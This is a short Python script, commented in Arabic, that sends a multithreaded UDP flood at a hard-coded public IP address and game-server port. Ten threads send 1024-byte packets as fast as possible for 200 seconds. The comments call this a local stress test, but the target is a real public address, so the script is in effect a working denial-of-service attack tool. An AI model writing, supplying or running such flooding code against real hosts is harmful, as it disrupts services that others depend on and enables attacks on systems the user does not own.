import socket
import time
import threading

# إعدادات الهدف التجريبي (محلياً مثلاً)
TARGET_IP = "193.233.114.200"
TARGET_PORT = 19134
DURATION = 200  # ثوانٍ محددة للتجربة

def stress_loop():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * 1024  # حجم الحمولة لكل حزمة
    end_time = time.time() + DURATION
    
    # حلقة إرسال مستمرة بأقصى سرعة ممكنة للجهاز
    while time.time() < end_time:
        try:
            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
        except Exception:
            break
            
    sock.close()

# تشغيل عدة مسارات (Threads) لزيادة كثافة التدفق
def main():
    threads = []
    for _ in range(10): # 10 مسارات متزامنة
        t = threading.Thread(target=stress_loop)
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    print("انتهى الاختبار التجريبي.")

if __name__ == "__main__":
    main()
